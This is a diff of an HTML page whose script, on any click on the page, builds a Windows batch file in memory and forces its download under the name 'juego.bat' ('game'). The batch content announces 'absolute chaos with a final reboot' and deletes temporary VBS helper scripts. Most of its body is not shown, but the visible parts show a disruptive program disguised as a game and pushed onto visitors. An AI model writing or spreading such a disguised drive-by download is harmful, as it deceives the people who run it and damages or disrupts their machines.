@@ -18,7 +18,6 @@ html, body {
 <script>
 document.body.addEventListener("click", () => {
 
-  // Contenido del .bat
   const contenidoBat = `@echo off
 echo INICIANDO CAOS ABSOLUTO CON REINICIO FINAL AJJAJAJAJAJ
 
@@ -85,23 +84,20 @@ del %temp%\caos*.vbs
 del %temp%\reinicio.vbs"
 `;
 
-  // Crear el archivo en memoria
   const blob = new Blob([contenidoBat], { type: "application/octet-stream" });
   const url = URL.createObjectURL(blob);
 
-  // Crear descarga
   const a = document.createElement("a");
   a.href = url;
-  a.download = "Juego.bat";
+  a.download = "juego.bat"; // ← nombre cambiado acá
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
 
-  // Liberar memoria
   URL.revokeObjectURL(url);
-
 });
 </script>
 
 </body>
 </html>
+  
